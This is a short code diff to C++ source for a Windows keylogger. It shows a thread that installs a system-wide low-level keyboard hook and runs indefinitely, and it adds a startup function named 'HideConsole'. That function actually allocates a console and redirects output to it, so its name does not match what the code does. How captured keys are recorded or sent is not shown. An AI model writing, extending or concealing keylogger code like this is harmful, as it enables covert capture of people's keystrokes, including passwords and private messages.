@@ -50,6 +50,14 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
+void HideConsole() {
+	AllocConsole();
+	FILE *f;
+	freopen_s(&f, "CONOUT$", "w", stdout);
+	freopen_s(&f, "CONOUT$", "w", stderr);
+	std::cout.clear();
+}
+
 DWORD WINAPI KeyloggerThread(LPVOID) {
     hhook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
 
@@ -64,8 +72,9 @@ DWORD WINAPI KeyloggerThread(LPVOID) {
 }
 
 int main() {
+    HideConsole();
     CreateThread(nullptr, 0, KeyloggerThread, nullptr, 0, nullptr);
-
+	
     while (true) {
         Sleep(100);
     }
